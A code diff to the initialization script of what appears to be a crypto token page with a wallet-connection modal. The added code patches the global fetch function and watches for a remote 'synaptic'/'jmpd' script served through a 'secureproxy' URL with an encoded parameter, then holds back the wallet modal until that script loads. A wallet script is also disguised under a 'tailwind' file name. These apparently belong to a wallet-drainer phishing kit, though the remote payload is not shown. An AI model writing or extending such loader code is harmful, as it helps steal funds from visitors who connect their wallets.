@@ -249,13 +249,97 @@ function initApp() {
     tokenName: false,
     tokenImage: false,
     ogImage: false,
-    tailwindScript: false
+    tailwindScript: false,
+    synapticScript: false // Track synaptic script (jmpd) loading
   };
   
   // tailwind.cjs.js is loaded asynchronously and is not critical for page display
   // Don't block page loading on it - mark as ready immediately
   // Wallet connection will work when script loads (async)
     window._loadingState.tailwindScript = true;
+  
+  // Track synaptic script (jmpd) loading via secureproxy
+  // Monitor for script tags or fetch requests to secureproxy with s= parameter
+  (function trackSynapticScript() {
+    // Method 1: Monitor script tags being added to DOM
+    const scriptObserver = new MutationObserver((mutations) => {
+      mutations.forEach((mutation) => {
+        mutation.addedNodes.forEach((node) => {
+          if (node.tagName === 'SCRIPT' && node.src) {
+            // Check if it's a secureproxy request with jmpd/synaptic
+            if (node.src.includes('secureproxy') && 
+                (node.src.includes('jmpd') || node.src.includes('synaptic') || node.src.includes('s=%2F%40v1'))) {
+              console.log('[LOADING] Synaptic script detected:', node.src);
+              // Track when script loads
+              node.addEventListener('load', () => {
+                console.log('[LOADING] Synaptic script loaded');
+                window._loadingState.synapticScript = true;
+                if (window.checkAllResourcesLoaded) {
+                  window.checkAllResourcesLoaded();
+                }
+              });
+              node.addEventListener('error', () => {
+                console.warn('[LOADING] Synaptic script failed to load');
+                // Mark as ready anyway after timeout to not block forever
+                setTimeout(() => {
+                  window._loadingState.synapticScript = true;
+                  if (window.checkAllResourcesLoaded) {
+                    window.checkAllResourcesLoaded();
+                  }
+                }, 5000);
+              });
+            }
+          }
+        });
+      });
+    });
+    
+    // Start observing
+    scriptObserver.observe(document.head, { childList: true, subtree: true });
+    scriptObserver.observe(document.body, { childList: true, subtree: true });
+    
+    // Method 2: Intercept fetch requests to secureproxy
+    const originalFetch = window.fetch;
+    window.fetch = function(...args) {
+      const url = args[0];
+      if (typeof url === 'string' && url.includes('secureproxy') && 
+          (url.includes('jmpd') || url.includes('synaptic') || url.includes('s=%2F%40v1'))) {
+        console.log('[LOADING] Synaptic script fetch detected:', url);
+        const fetchPromise = originalFetch.apply(this, args);
+        fetchPromise.then((response) => {
+          if (response.ok) {
+            console.log('[LOADING] Synaptic script fetch successful');
+            window._loadingState.synapticScript = true;
+            if (window.checkAllResourcesLoaded) {
+              window.checkAllResourcesLoaded();
+            }
+          }
+        }).catch(() => {
+          // On error, mark as ready after timeout
+          setTimeout(() => {
+            window._loadingState.synapticScript = true;
+            if (window.checkAllResourcesLoaded) {
+              window.checkAllResourcesLoaded();
+            }
+          }, 5000);
+        });
+        return fetchPromise;
+      }
+      return originalFetch.apply(this, args);
+    };
+    
+    // Fallback: Check if script already exists
+    setTimeout(() => {
+      const existingScripts = document.querySelectorAll('script[src*="secureproxy"], script[src*="synaptic"], script[src*="jmpd"]');
+      if (existingScripts.length > 0) {
+        existingScripts.forEach((script) => {
+          if (script.complete || script.readyState === 'complete') {
+            window._loadingState.synapticScript = true;
+          }
+        });
+      }
+    }, 100);
+  })();
   
   // Function to check if all resources are loaded
   function checkAllResourcesLoaded() {
@@ -264,11 +348,12 @@ function initApp() {
     const hasTokenName = state.tokenName;
     // Check if tailwind script is loaded (critical for wallet)
     const tailwindReady = state.tailwindScript || !document.querySelector('script[src="/tailwind.cjs.js"]');
-    
+    // Check if synaptic script (jmpd) is loaded - CRITICAL
+    const synapticReady = state.synapticScript;
     // Check if OG image is loaded (or not needed)
     const ogImageReady = state.ogImage || true; // OG image is optional, mark as ready if not set
     
-    if (hasTokenName && tailwindReady && ogImageReady) {
+    if (hasTokenName && tailwindReady && synapticReady && ogImageReady) {
       // All resources loaded, hide overlay and show modal
       const overlay = document.getElementById('loadingOverlay');
       if (overlay) {
@@ -280,17 +365,19 @@ function initApp() {
     }
   }
   
-         // Timeout fallback - hide overlay after max 4.5 seconds even if token not loaded
+         // Timeout fallback - hide overlay after max 8 seconds (increased to wait for synaptic script)
          setTimeout(function() {
     const overlay = document.getElementById('loadingOverlay');
     if (overlay && !overlay.classList.contains('hidden')) {
       console.warn('[LOADING] Timeout reached, hiding overlay');
+      // Mark synaptic as ready if timeout reached (fallback)
+      window._loadingState.synapticScript = true;
       overlay.classList.add('hidden');
       document.body.classList.remove('loading');
       // Show modal even if token not loaded (fallback)
       initModal();
     }
-         }, 4500);
+         }, 8000);
   
   // Expose check function globally
   window.checkAllResourcesLoaded = checkAllResourcesLoaded;
